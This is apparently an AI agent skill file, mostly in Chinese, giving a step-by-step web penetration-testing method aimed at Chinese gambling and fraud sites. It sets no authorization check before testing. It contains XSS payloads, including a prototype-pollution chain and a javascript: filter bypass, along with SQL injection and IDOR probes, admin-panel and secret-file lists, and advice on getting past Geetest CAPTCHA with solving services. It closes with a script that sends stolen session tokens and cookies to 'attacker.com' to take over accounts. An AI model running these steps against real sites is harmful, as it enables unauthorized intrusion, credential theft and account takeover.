---
name: web-app-security-audit
description: "Web应用安全审计技能。系统化分析目标站点的技术栈、API接口、认证机制、XSS/注入/提权等漏洞。覆盖中文博彩/诈骗站点的特殊架构（Vue3+Geetest+PHP+加密API）。触发：安全审计、渗透测试、漏洞扫描、web安全分析、站点逆向。"
version: 1.0.0
author: Hermes Agent
license: MIT
platforms: [linux, macos]
metadata:
  hermes:
    tags: [security, pentest, web-audit, xss, prototype-pollution, api-enumeration, gambling-sites, vue3-security, geetest-bypass]
    related_skills: [ai-pentest-toolkit, godmode, reverse-skill-router, vulnclaw]
---

# Web应用安全审计

系统化Web应用安全测试方法论，特别针对中文博彩/诈骗站点架构。

## When to Use This Skill

Trigger when the user:
- Asks to analyze/audit a website's security
- Wants to find vulnerabilities in a web application
- Asks about API enumeration, auth bypass, XSS testing
- Mentions 安全审计, 渗透测试, 漏洞扫描, 破甲
- Wants to analyze gambling/fraud sites (博彩, 诈骗)
- Asks about Geetest CAPTCHA bypass
- Wants to reverse-engineer encrypted API responses

## Phase 1: 技术栈侦察

### 1.1 前端框架识别
```javascript
// 在浏览器控制台执行
(function(){
  const r = {
    vue2: !!(document.querySelector('#app')?.__vue__),
    vue3: !!(document.querySelector('#app')?.__vue_app__),
    react: !!window.__REACT_DEVTOOLS_GLOBAL_HOOK__,
    angular: !!document.querySelector('[ng-version]'),
    jquery: typeof jQuery !== 'undefined' ? jQuery.fn.jquery : 'none',
    scripts: [...document.querySelectorAll('script[src]')].map(s => s.src),
    version: window.__APP_VERSION__,
  };
  return JSON.stringify(r, null, 2);
})();
```

### 1.2 服务器信息
```javascript
fetch(window.location.href, {method: 'HEAD'}).then(r => {
  const h = {};
  r.headers.forEach((v, k) => h[k] = v);
  console.log(h);
});
```

### 1.3 安全头检查
必须检查的头（缺失 = 漏洞）:
- Content-Security-Policy
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security
- X-XSS-Protection
- Access-Control-Allow-Origin

## Phase 2: API接口枚举

### 2.1 从前端JS提取API端点
```javascript
// 搜索所有JS文件中的API路径
fetch('/path/to/main.js').then(r => r.text()).then(t => {
  const apis = t.match(/["'](api\/[^"']+)["']/gi);
  console.log([...new Set(apis)]);
});
```

### 2.2 常见API路径探测
```
api/User/*          用户相关
api/Admin/*         管理后台
api/Web/*           网站配置
api/Act/*           活动相关
api/Pay/*           支付相关
api/Manage/*        管理接口
```

### 2.3 未授权访问测试
直接fetch每个API端点，检查是否返回数据而非认证错误。

## Phase 3: 加密API响应解密

### 常见加密模式

**模式1: 反转+Base64（最常见于博彩站点）**
```python
import base64, json
def decrypt(encoded):
    reversed_str = encoded[::-1]
    return json.loads(base64.b64decode(reversed_str).decode('utf-8'))
```

**模式2: AES-CBC**
搜索JS中的 CryptoJS.AES.decrypt 调用，提取 key/iv。

**模式3: DES/3DES**
搜索 TripleDES 或 DES 相关调用。

### 解密验证方法
找一个已知明文的接口（如CheckSession返回错误消息），用解密算法验证。

## Phase 4: 认证机制分析

### 4.1 Session管理
```javascript
// 检查token存储位置
localStorage.getItem('USER_SESSION_KEY')
localStorage.getItem('LOGIN_USER_KEY')
document.cookie
```

### 4.2 Token格式分析
- Bearer Token → 标准JWT
- Custom Header → 自定义token
- Cookie-based → CSRF风险

### 4.3 会话固定测试
尝试预设session值，检查服务端是否验证。

## Phase 5: XSS测试

### 5.1 原型污染 → XSS（jQuery < 3.4.0）
```javascript
// CVE-2019-11358
const malicious = JSON.parse('{"__proto__":{"polluted":"yes"}}');
jQuery.extend(true, {}, malicious);
console.log({}.polluted); // "yes" = 可利用
```

升级为XSS:
```javascript
// 污染常用DOM属性
const payload = JSON.parse('{"__proto__":{"src":"javascript:alert(1)","innerHTML":"<img src=x onerror=alert(1)>"}}');
jQuery.extend(true, {}, payload);
```

### 5.2 document.write协议绕过
```
// 当检查 .includes("http://") 时：
javascript:alert(1)//http://
// 包含"http://"通过检查，但执行javascript:协议
```

### 5.3 Vue自定义指令XSS
搜索危险指令:
```javascript
const directives = document.querySelector('#app').__vue_app__._context.directives;
// 危险: src-html, v-html类似物
```

### 5.4 innerHTML审计
搜索所有 `.innerHTML=` 赋值，检查值是否来自用户可控输入。

## Phase 6: 提权测试

### 6.1 IDOR测试
```
api/User/GetUserInfo?id=1
api/User/GetUserInfo?id=2
api/User/GetUserInfo?userId=admin
```

### 6.2 管理后台探测
```
/admin  /manage  /backend  /back
admin.{domain}  manage.{domain}
api/Admin/  api/Manage/
```

### 6.3 敏感文件探测
```
.env  config.php  phpinfo.php  robots.txt
.git/config  .svn/entries  backup.sql
swagger-ui.html  api-docs
```

### 6.4 SQL注入快速测试
```
id=1'  id=1"  id=1 OR 1=1  id=1'--
```

## 中文博彩站点特殊架构

详见 `references/gambling-site-architecture.md`

### 典型技术栈
- 前端: Vue 3 + Vant UI + jQuery 1.x
- 验证码: Geetest v4 (极验)
- 后端: PHP + Nginx反向代理
- API加密: 反转+Base64（极常见）
- 认证: 自定义Token头
- 域名: 一次性域名模式

### 常见漏洞
1. jQuery老版本 → 原型污染
2. 无CSP → XSS全权限
3. API加密可逆 → 信息泄露
4. Geetest captchaId硬编码 → 可绕过
5. 密码仅MD5无盐 → 彩虹表
6. 网站配置API未授权 → 全量配置泄露

### XSS → Token窃取 → 账户接管
```javascript
const tokens = {
  USER_SESSION_KEY: localStorage.getItem('USER_SESSION_KEY'),
  LOGIN_USER_KEY: localStorage.getItem('LOGIN_USER_KEY'),
  cookies: document.cookie,
};
fetch('https://attacker.com/collect', {
  method: 'POST',
  body: JSON.stringify(tokens),
  mode: 'no-cors'
});
```

## Pitfalls

1. **fetch在SPA中可能失败** — Vue Router切换页面后，fetch的base URL可能变化。始终用绝对URL。
2. **JS文件搜索用正则要注意Unicode** — 中文博彩站的JS常用Unicode转义。搜索时用Unicode模式。
3. **加密响应不要假设算法** — 先找JS中的解密函数，不要猜。常见有反转+Base64、AES、DES。
4. **Geetest v4不等于不可绕** — captchaId硬编码在前端，可用第三方打码平台。
5. **原型污染需要sink** — 污染Object.prototype不自动等于XSS，需要找到读取污染属性的DOM操作。
6. **document.write协议绕过需要触发条件** — payload需要能到达document.write调用点。
7. **Vue 3的v-html比v-text危险** — 搜索v-html绑定找到innerHTML注入点。
8. **SPA的hash路由不会发送到服务器** — hash注入是纯客户端，需要DOM sink。
9. **中文错误消息是好信标** — "会话已过期"等中文错误消息可以用来确认加密算法正确。
10. **管理后台可能在不同子域名** — admin/manage/back.{domain} 或完全不同的域名。
